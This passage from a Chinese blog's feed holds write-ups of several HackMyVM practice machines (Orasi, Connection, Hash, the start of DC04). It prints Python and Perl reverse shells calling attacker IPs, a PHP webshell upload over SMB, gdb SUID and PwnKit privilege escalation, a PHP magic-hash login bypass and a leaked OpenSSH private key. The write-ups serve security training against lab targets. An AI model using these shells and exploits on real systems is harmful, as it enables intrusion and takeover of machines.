&gt;&gt;&gt; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.212.3",1888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
<br><img alt="Pasted image 20241206132822" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206132822.png" referrerpolicy="no-referrer"><br><br>(remote) kori@orasi:/var/www/html$ sudo -l
Matching Defaults entries for kori on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kori may run the following commands on orasi:
    (irida) NOPASSWD: /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk

<br>可以复制irida目录下面的apk到当前用户目录下面<br>复制之前先要创建一个 /home/kori/irida.apk  并且给权限<br>(remote) kori@orasi:/home/kori$ touch /home/kori/irida.apk
(remote) kori@orasi:/home/kori$ chmod 777 /home/kori/irida.apk
(remote) kori@orasi:/home/kori$ sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
<br>然后传到本地。逆向分析一下<br>
用jeb分析可以发现关键字符串<br>
<img alt="Pasted image 20241206152120" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206152120.png" referrerpolicy="no-referrer"><br>
这个多半就是账号密码<br>
右键解析<br>
<img alt="Pasted image 20241206152657" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206152657.png" referrerpolicy="no-referrer"><br>可以发现对 1 #2 #3 #4 #5 进行了处理<br>
正确的密码应该是 eye.of.the.tiger.()<br>
尝试登录发现是错误的。<br>靶机作者有给过一个提示。<br>
<img alt="Pasted image 20241206153024" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206153024.png" referrerpolicy="no-referrer"><br>
只是一个无用的小点
<br>可能是说有一个点没有用<br>
经过测试 正确密码是 eye.of.the.tiger()<br>ssh登录成功<br>┌──(root㉿kali)-[/home/kali/hmv/orasi]
└─# ssh irida@192.168.212.4
irida@192.168.212.4''s password:
Linux orasi 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb 11 18:48:10 2021 from 10.0.2.15
irida@orasi:~$ id
uid=1000(irida) gid=1000(irida) groups=1000(irida),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)


irida@orasi:~$ cat user.txt
2afb9cbb10c22dc7e154a8c434595948

<br><br>irida@orasi:~$ sudo -l
Matching Defaults entries for irida on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User irida may run the following commands on orasi:
    (root) NOPASSWD: /usr/bin/python3 /root/oras.py

<br>这里我们可以执行 root/oras.py<br>
但是我们不知道脚本的具体内容<br>
随便执行可以发现其中的报错<br>irida@orasi:~$ sudo -u root python3  /root/oras.py
: whomai
Traceback (most recent call last):
  File "/root/oras.py", line 7, in &lt;module&gt;
    name = bytes.fromhex(name).decode('utf-8')
ValueError: non-hexadecimal number found in fromhex() arg at position 0

<br>name = bytes.fromhex(name).decode('utf-8')<br>
很明显我们应该是要输入一个16进制的值<br>尝试输入 whoamI 的16进制值<br>irida@orasi:~$ sudo -u root python3  /root/oras.py
: 77686f616d69
Traceback (most recent call last):
  File "/root/oras.py", line 8, in &lt;module&gt;
    print(exec(name))
  File "&lt;string&gt;", line 1, in &lt;module&gt;
NameError: name 'whoami' is not defined

<br>还是报错了。但是又多了一个错误<br>
print(exec(name))<br>明显这里会执行一个参数 name 而这里 name 我们输入16进制对应字符串是 whoami<br>这里用的是python执行。那我们就应该按照python调用系统命令的方式传递参数<br>string:import os;os.system('whoami');
696d706f7274206f733b6f732e73797374656d282777686f616d6927293b

irida@orasi:~$ sudo -u root python3  /root/oras.py
: 696d706f7274206f733b6f732e73797374656d282777686f616d6927293b
root
None

<br>ok成功<br>那我们修改一下内容就行了<br>string:import os;os.system('cat /root/root.txt');
hex:696d706f7274206f733b6f732e73797374656d2827636174202f726f6f742f726f6f742e74787427293b

irida@orasi:~$ sudo -u root python3  /root/oras.py
: 696d706f7274206f733b6f732e73797374656d2827636174202f726f6f742f726f6f742e74787427293b
b1c17c79773c831cbb9109802059c6b5
None


<br>最后，这是python的代码<br>import os
import base64
import re
import sys

name = input(": ")
name = bytes.fromhex(name).decode('utf-8')
print(exec(name))
]]></description><link>https://www.c1trus.top/24-渗透/hmv/40.orasi.html</link><guid isPermaLink="false">24-渗透/HMV/40.orasi.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.Connection]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. SMB服务" data-href="#3. SMB服务" href="https://www.c1trus.top/about:blank#3._SMB服务" class="internal-link" target="_self" rel="noopener nofollow">3. SMB服务</a>
<br><a data-tooltip-position="top" aria-label="4. webshell" data-href="#4. webshell" href="https://www.c1trus.top/about:blank#4._webshell" class="internal-link" target="_self" rel="noopener nofollow">4. webshell</a>
<br><a data-tooltip-position="top" aria-label="5. SUID提权" data-href="#5. SUID提权" href="https://www.c1trus.top/about:blank#5._SUID提权" class="internal-link" target="_self" rel="noopener nofollow">5. SUID提权</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Connection
<br>作者：<a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=whitecr0wz" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=whitecr0wz" target="_blank"> whitecr0wz</a><br>难度：⭐️⭐️
<br>知识点：SUID提权-gdb 、SMB服务
<br><br>端口扫描<br>Nmap scan report for 192.168.9.6
Host is up (0.00016s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:46:CA:97 (Oracle VirtualBox virtual NIC)
<br>目录扫描<br>gobuster dir -u http://192.168.9.6/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,zip,css,txt
<br>没有啥东西<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png" referrerpolicy="no-referrer"><br><br>扫描端口发现开启了139与445端口，这是SMB服务的特征 <br>利用enum4linux 工具对目标主机的smb服务进行扫描<br>enum4linux -a -o 192.168.9.6
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.002.png" referrerpolicy="no-referrer"><br>可以发现share文件夹可以读取<br>smbclient连接上去<br>┌──(root㉿kali)-[/home/kali]
└─# smbclient //192.168.9.6/share
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Sep 23 09:48:39 2020
  ..                                  D        0  Wed Sep 23 09:48:39 2020
  html                                D        0  Wed Sep 23 10:20:00 2020

                7158264 blocks of size 1024. 5295652 blocks available
smb: \&gt; allinfo html
altname: html
create\_time:    Wed Sep 23 10:20:00 AM 2020 CST
access\_time:    Sun Nov  3 01:51:49 PM 2024 CST
write\_time:     Wed Sep 23 10:20:00 AM 2020 CST
change\_time:    Wed Sep 23 10:20:00 AM 2020 CST
attributes: D (10)
<br>发现里面有一个这个html目录，进去后发现就是网站的根目录<br>而且目录的属性是10 <br>即8+2 <br>8：这是一个目录<br>2：这个文件夹是隐藏的<br>第 0 位（1）：表示 只读（Read-only）。
第 1 位（2）：表示 隐藏（Hidden）。
第 2 位（4）：表示 系统文件（System）。
第 3 位（8）：表示 目录（Directory）。
第 4 位（16）：表示 存档（Archive）。
<br>这里可以说明html文件是可以写入的<br>直接传一个后门<br>cd html
put 1.php
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.003.png" referrerpolicy="no-referrer"><br><br>发现传的eval马好像不太好弹shell<br>
重新传了一个系统马<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.004.png" referrerpolicy="no-referrer"><br>弹shell<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.005.png" referrerpolicy="no-referrer"><br>cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.9.3%22%3B%24p%3D1122%3Bsocket%28S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr\_in%28%24p%2Cinet\_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
<br><br>(remote) www-data@connection:/var/www/html$ find / -perm -4000 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/passwd
/usr/bin/gdb
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.006.png" referrerpolicy="no-referrer"><br>cd /usr/bin
./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.007.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/4.connection.html</link><guid isPermaLink="false">24-渗透/HMV/4.Connection.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[39.Hash]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 0e绕过" data-href="#2.1. 0e绕过" href="https://www.c1trus.top/about:blank#2.1._0e绕过" class="internal-link" target="_self" rel="noopener nofollow">2.1. 0e绕过</a>


<br><a data-tooltip-position="top" aria-label="3. 方式1：PWNkit 提权root" data-href="#3. 方式1：PWNkit 提权root" href="https://www.c1trus.top/about:blank#3._方式1：PWNkit_提权root" class="internal-link" target="_self" rel="noopener nofollow">3. 方式1：PWNkit 提权root</a>
<br><a data-tooltip-position="top" aria-label="4. 方式2正常提权" data-href="#4. 方式2正常提权" href="https://www.c1trus.top/about:blank#4._方式2正常提权" class="internal-link" target="_self" rel="noopener nofollow">4. 方式2正常提权</a><br>
- <a data-tooltip-position="top" aria-label="4.1. 提权到 maria 用户" data-href="#4.1. 提权到 maria 用户" href="https://www.c1trus.top/about:blank#4.1._提权到_maria_用户" class="internal-link" target="_self" rel="noopener nofollow">4.1. 提权到 maria 用户</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Hash" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Hash</a><br>
作者 sml<br>
难度 ⭐️⭐️
<br><br>Warning
靶机必须要能出网才行。不能出网不会开放80端口
<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
└─# nmap -sCV 192.168.42.79
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 10:10 CST
Nmap scan report for 192.168.42.79
Host is up (0.000090s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1e:fb:86:3d:cf:26:a2:a0:ae:b0:00:61:0b:41:cb:ab (RSA)
|   256 80:8e:46:7b:1d:6e:13:74:22:89:ad:91:b4:44:64:ec (ECDSA)
|_  256 71:e5:e1:4f:34:16:de:ec:b5:c4:fe:f5:0a:a2:ee:fc (ED25519)
80/tcp   open  http          nginx 1.14.2
|_http-title: LOGIN
|_http-server-header: nginx/1.14.2
3389/tcp open  ms-wbt-server xrdp
MAC Address: 08:00:27:8C:10:84 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds

<br>首页是一个登录框<br>
<img alt="Pasted image 20241205101329" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" referrerpolicy="no-referrer"><br>
看一下源代码代码 可以发现有提示<br>&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;title&gt;LOGIN&lt;/title&gt;

    &lt;form class="form-signin" action="check.php" method="post"&gt;

      &lt;input type="text" autocomplete="off" id="user" name="user" name="user" placeholder="Username" required autofocus&gt;
      &lt;input type="password" name="password" id="password" placeholder="Password" required&gt;
      &lt;input type="submit" value="Login"&gt;
    &lt;/form&gt;
&lt;!-- Marco, remember to delete the .bak file--&gt;
  &lt;/body&gt;
&lt;/html&gt;
<br>获取到一个用户 Marco  告诉我们里面有一个.bak文件<br>目录扫描<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
└─# gobuster dir -u http://192.168.42.79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,bak,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.42.79
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,bak,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 453]
/check.bak            (Status: 200) [Size: 273]
/check.php            (Status: 200) [Size: 19]

<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
└─# curl http://192.168.42.79/check.php
INVALID CREDENTIALS                                                                                                        
┌──(root㉿kali)-[/home/kali/hmv/hash]
└─# curl http://192.168.42.79/check.bak
&lt;?php
// Login part.
$pass = $_POST['password'];
//marco please dont use md5, is not secure.
//$passwordhashed = hash('md5', $pass);
$passwordhashed = hash('sha256',$pass);
if ($passwordhashed == '0e0001337') {
//Your code here
}
else{
//Another code here
}
//To finish
?&gt;

<br>可以发现这个判断是一个弱等于<br>
使用0e绕过<br><br>绕过原理：PHP在处理字符串时会出现缺陷，如果字符串为’5e2’，本来只是一个正常字符串，但PHP会认为这是科学计数法里的e，那么PHP进行比较时会将这个字符串按照科学计数法计算，即5e2=5*10^2=500，由此0e100被认为和0相等。md5加密后的哈希值是一串16进制数，因此需要哈希值第一位为0，第二位为e即可，后面不论是什么都认为和0相等<br>payload看这里 <a rel="noopener nofollow" class="external-link" href="https://github.com/spaze/hashes/blob/master/sha256.md" target="_blank">https://github.com/spaze/hashes/blob/master/sha256.md</a><br>到主页密码输入payload 用户随便输入 登录后可以获取到私钥<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
└─# curl http://192.168.42.79/check.php -X POST -d "user=12312&amp;password=34250003024812"

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxiKdFmWJiVfVYaNGov1xuh0/nrXnNsx2s6g5IoIJrmkX+9qzt2US
ZWMgrjLzAyB3wrLFysCPh4F8GU87pJkbpc0prM/8vB2WJCg5ktDQ6o0vwH219sPKUS4e9R
s2bPz7CJX5bzFDQ3B6ZUOs1itZ1t/uq38XuCxDjI8XxU6fusB3Rjz2XIombtFwo78W1pkX
VnQhzZOQ+b8UaC5lZeKatcZ0xdc0iQgiAbcRN7sXYCDMxMmo9KsxqzWjd56hLrv1nsTy2t
VBXzDRw+5JU4AJlGDRB/Upq/oKbGDCOmgNUsJPQKW4TgEAWhUa+t/ue2Bs/wFjCY7w/LkY
pK4bnY5eHQAAA8C/pv23v6b9twAAAAdzc2gtcnNhAAABAQDGIp0WZYmJV9Vho0ai/XG6HT
+etec2zHazqDkiggmuaRf72rO3ZRJlYyCuMvMDIHfCssXKwI+HgXwZTzukmRulzSmsz/y8
HZYkKDmS0NDqjS/AfbX2w8pRLh71GzZs/PsIlflvMUNDcHplQ6zWK1nW3+6rfxe4LEOMjx
fFTp+6wHdGPPZciiZu0XCjvxbWmRdWdCHNk5D5vxRoLmVl4pq1xnTF1zSJCCIBtxE3uxdg
IMzEyaj0qzGrNaN3nqEuu/WexPLa1UFfMNHD7klTgAmUYNEH9Smr+gpsYMI6aA1Swk9Apb
hOAQBaFRr63+57YGz/AWMJjvD8uRikrhudjl4dAAAAAwEAAQAAAQEAlMcLA/VMmGfu33kW
Im+DRUiPLCLVMo3HmFH6TRIuKNvbWY+4oT5w2NbdhFDXr4Jiyz0oTn3XiN3PDMY1N/yMCS
0MXSp0UeE5i3709Gx+Y5GOyNDcoSYVtm2Wa2B6ts4jxievfDIWmv5LudxeXReCR1oxQm+V
pQL/2fzc0ZifUj+/VSSIltgDKHxEfebfK0xShgXTSlUhickSapre2ArSdplM/rYvZLDWmd
iGkGD3VnAgRtloy5v32vPI3M++OCrHbLxgff4odAjawejPPHVj3beMgCrqwb/CCNKEyWKc
Jkjjt7nY/GUW4RfzM34LplezpmvrsLkTVMAb3KflDkDPFQAAAIBrP6Pnz0t8d/M+4hEb66
IkrftwqMC+c8Z0HMGURTMco7jXfoXaVP3eWCafEZ/RobZm0Ob1mnBZ574Qn8ai5VLPyJz6
5Ibe1Z6LWu6yCL/VFNyksnVARIuVjQt9pXpzbXOfn0H4ZHRBFyRhNHGjnft1PA59O30Dpw
UVz9eO3K2EqQAAAIEA4baQFa4RYnZ/YK4F6acjsAPhk88poLjDT86eCQ08wO5+d8BGuSHE
+BAqCZJuJTvvozYpZ5NFW4OEG9+T/HX2tvB6Ucc1pbQNNnB7CBp/VoLLTW+nuU3YJbgYlx
VnWRRudD6K7wjZEHJ44XzLdTy2wyeUvZw/iJRZmqQ5hxXCD1MAAACBAOC4ucZotWaq/pb5
V5RqLV8HU+DWFHAIfvqtYI5wCcZmAjGtXgLF1HY9MZ3bRPz2/m7cB44cdgCRbtmqBvnOvn
6h9AS4gr1HOJEpjgohkxBTc2Mf/dpCCdcNCX2Xy5ExPSilbS2rUHHCIU2J/yZGTths8fBR
cEjmSYvt0qFY/t7PAAAACm1hcmNvQGhhc2g=
-----END OPENSSH PRIVATE KEY-----
<br>然后可以用私钥连接到marco用户上去<br>marco@hash:~$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hash

PWNED DATE: Wed 04 Dec 2024 09:45:49 PM EST

WHOAMI: uid=1000(marco) gid=1000(marco) groups=1000(marco),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: hashmanready

------------------------

<br><br>检测存在Pwnkit漏洞<br>marco@hash:~$ bash lzs.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

<br>但是本地没有gcc  所以我们不能本地编译，我就在自己的kali上编译<br>
而且kali的Libc与靶机的版本不同。所以采用静态编译<br>kali静态编译
┌──(root㉿kali)-[/home/pwnkit/CVE-2021-4034-main]
└─# make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" &gt; gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.

┌──(root㉿kali)-[/home/pwnkit/CVE-2021-4034-main]
└─# cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c

┌──(root㉿kali)-[/home/pwnkit/CVE-2021-4034-main]
└─# cc -Wall    cve-2021-4034.c   -o cve-2021-4034 -static

然后把 pwnkit.so  cve-2021-4034 传到靶机运行即可
marco@hash:~/CVE-2021-4034-main$ chmod +x cve-2021-4034
marco@hash:~/CVE-2021-4034-main$ ./cve-2021-4034
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(marco)
# sh /root/flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hash

PWNED DATE: Wed Dec  4 22:14:52 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(marco)

FLAG: hashhater

------------------------



<br><br><br>maria用户的目录下面有一个myterm.sh<br>marco@hash:/home/maria$ cat myterm.sh
export DISPLAY=:10
xterm
]]></description><link>https://www.c1trus.top/24-渗透/hmv/39.hash.html</link><guid isPermaLink="false">24-渗透/HMV/39.Hash.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[38.DC04]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.3. 网址利用" data-href="#2.3. 网址利用" href="https://www.c1trus.top/about:blank#2.3._网址利用" class="internal-link" target="_self" rel="noopener nofollow">2.3. 网址利用</a>


<br><a data-tooltip-position="top" aria-label="3. websvc用户" data-href="#3. websvc用户" href="https://www.c1trus.top/about:blank#3._websvc用户" class="internal-link" target="_self" rel="noopener nofollow">3. websvc用户</a>

<br><a data-tooltip-position="top" aria-label="3.1. NTLM中毒攻击" data-href="#3.1. NTLM中毒攻击" href="https://www.c1trus.top/about:blank#3.1._NTLM中毒攻击" class="internal-link" target="_self" rel="noopener nofollow">3.1. NTLM中毒攻击</a>
<br><a data-tooltip-position="top" aria-label="3.2. smb探测" data-href="#3.2. smb探测" href="https://www.c1trus.top/about:blank#3.2._smb探测" class="internal-link" target="_self" rel="noopener nofollow">3.2. smb探测</a>


<br><a data-tooltip-position="top" aria-label="4. rtina97用户" data-href="#4. rtina97用户" href="https://www.c1trus.top/about:blank#4._rtina97用户" class="internal-link" target="_self" rel="noopener nofollow">4. rtina97用户</a>

<br><a data-tooltip-position="top" aria-label="4.1. rpc获取用户信息" data-href="#4.1. rpc获取用户信息" href="https://www.c1trus.top/about:blank#4.1._rpc获取用户信息" class="internal-link" target="_self" rel="noopener nofollow">4.1. rpc获取用户信息</a>
<br><a data-tooltip-position="top" aria-label="4.2. 破解压缩包" data-href="#4.2. 破解压缩包" href="https://www.c1trus.top/about:blank#4.2._破解压缩包" class="internal-link" target="_self" rel="noopener nofollow">4.2. 破解压缩包</a>
<br><a data-tooltip-position="top" aria-label="4.3. 报告审计" data-href="#4.3. 报告审计" href="https://www.c1trus.top/about:blank#4.3._报告审计" class="internal-link" target="_self" rel="noopener nofollow">4.3. 报告审计</a>


<br><a data-tooltip-position="top" aria-label="5. 黄金票据" data-href="#5. 黄金票据" href="https://www.c1trus.top/about:blank#5._黄金票据" class="internal-link" target="_self" rel="noopener nofollow">5. 黄金票据</a><br>
- <a data-tooltip-position="top" aria-label="5.1. 利用条件" data-href="#5.1. 利用条件" href="https://www.c1trus.top/about:blank#5.1._利用条件" class="internal-link" target="_self" rel="noopener nofollow">5.1. 利用条件</a><br>
- <a data-tooltip-position="top" aria-label="5.2. 获取域SID" data-href="#5.2. 获取域SID" href="https://www.c1trus.top/about:blank#5.2._获取域SID" class="internal-link" target="_self" rel="noopener nofollow">5.2. 获取域SID</a><br>
- <a data-tooltip-position="top" aria-label="5.3. 同步域时间" data-href="#5.3. 同步域时间" href="https://www.c1trus.top/about:blank#5.3._同步域时间" class="internal-link" target="_self" rel="noopener nofollow">5.3. 同步域时间</a><br>
- <a data-tooltip-position="top" aria-label="5.4. 生成管理员的黄金票据" data-href="#5.4. 生成管理员的黄金票据" href="https://www.c1trus.top/about:blank#5.4._生成管理员的黄金票据" class="internal-link" target="_self" rel="noopener nofollow">5.4. 生成管理员的黄金票据</a><br>
- <a data-tooltip-position="top" aria-label="5.5. 导入票据到环境变量" data-href="#5.5. 导入票据到环境变量" href="https://www.c1trus.top/about:blank#5.5._导入票据到环境变量" class="internal-link" target="_self" rel="noopener nofollow">5.5. 导入票据到环境变量</a><br>
- <a data-tooltip-position="top" aria-label="5.6. PTT" data-href="#5.6. PTT" href="https://www.c1trus.top/about:blank#5.6._PTT" class="internal-link" target="_self" rel="noopener nofollow">5.6. PTT</a><br>
靶机链接<br>
作者<br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br><br>┌──(root㉿kali)-[/home/kali/hmv/dc04]
└─# fscan -h 192.168.69.4

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.69.4:139 open
192.168.69.4:80 open
192.168.69.4:135 open
192.168.69.4:445 open
192.168.69.4:88 open
[*] alive ports len is: 5
start vulscan
[*] NetBios 192.168.69.4    [+] DC:SOUPEDECODE\DC01
[*] NetInfo
[*]192.168.69.4
   [-&gt;]DC01
   [-&gt;]192.168.69.4
[*] WebTitle http://192.168.69.4       code:302 len:0      title:None 跳转url: http://soupedecode.local
已完成 5/5
[*] 扫描结束,耗时: 3.264268642s

┌──(root㉿kali)-[/home/kali/hmv/dc04]
└─# nmap -sCV 192.168.69.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 23:13 CST
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 23:13 (0:00:00 remaining)
